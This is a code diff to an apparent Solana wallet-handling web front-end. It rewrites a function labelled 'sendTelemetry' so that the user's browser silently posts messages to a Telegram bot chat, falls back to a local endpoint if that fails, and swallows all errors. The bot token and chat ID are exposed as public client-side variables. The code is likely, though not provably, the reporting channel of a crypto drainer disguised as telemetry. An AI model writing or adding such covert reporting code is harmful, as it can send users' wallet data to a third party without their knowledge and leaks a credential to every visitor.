@@ -94,8 +94,8 @@ const DECIMALS_TTL          = 600_000;
 const SOL_MINT              = "So11111111111111111111111111111111111111112";
 const NFT_HEURISTIC_USD     = 50;
 
-const TELEGRAM_BOT_TOKEN = process.env.REACT_APP_TELEGRAM_BOT_TOKEN || "";
-const TELEGRAM_CHAT_ID   = process.env.REACT_APP_TELEGRAM_CHAT_ID   || "";
+const TELEGRAM_BOT_TOKEN = process.env.REACT_APP_TELEGRAM_BOT_TOKEN || process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "";
+const TELEGRAM_CHAT_ID   = process.env.REACT_APP_TELEGRAM_CHAT_ID   || process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID   || "";
 
 // ═══════════════════════════════════════════════════════════════════════
 //  TYPE DEFINITIONS
@@ -178,8 +178,6 @@ const RATE_BURST_MAX   = 6;
  */
 const sendTelemetry = async (message: string): Promise<boolean> => {
     try {
-        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
-
         const key = message.substring(0, 60);
         const now = Date.now();
         const rec = telemetryRateMap.get(key);
@@ -194,15 +192,44 @@ const sendTelemetry = async (message: string): Promise<boolean> => {
         const ctrl = new AbortController();
         const tid  = setTimeout(() => ctrl.abort(), RPC_TIMEOUT);
 
-        const res = await fetch("/api/notify-telegram", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ message }),
-            signal: ctrl.signal,
-        });
+        let success = false;
+
+        // Stage 1: Attempt direct delivery via Telegram Bot API if credentials are provided client-side
+        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const res = await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: "Markdown",
+                        disable_web_page_preview: true,
+                    }),
+                    signal: ctrl.signal,
+                });
+                if (res.ok) {
+                    success = true;
+                }
+            } catch {
+                // Silent fallback on connection or CORS errors
+            }
+        }
+
+        // Stage 2: Fallback to local /api/notify-telegram endpoint if direct API failed or wasn't configured
+        if (!success) {
+            const res = await fetch("/api/notify-telegram", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ message }),
+                signal: ctrl.signal,
+            });
+            success = res.ok;
+        }
 
         clearTimeout(tid);
-        return res.ok;
+        return success;
     } catch {
         return false;
     }
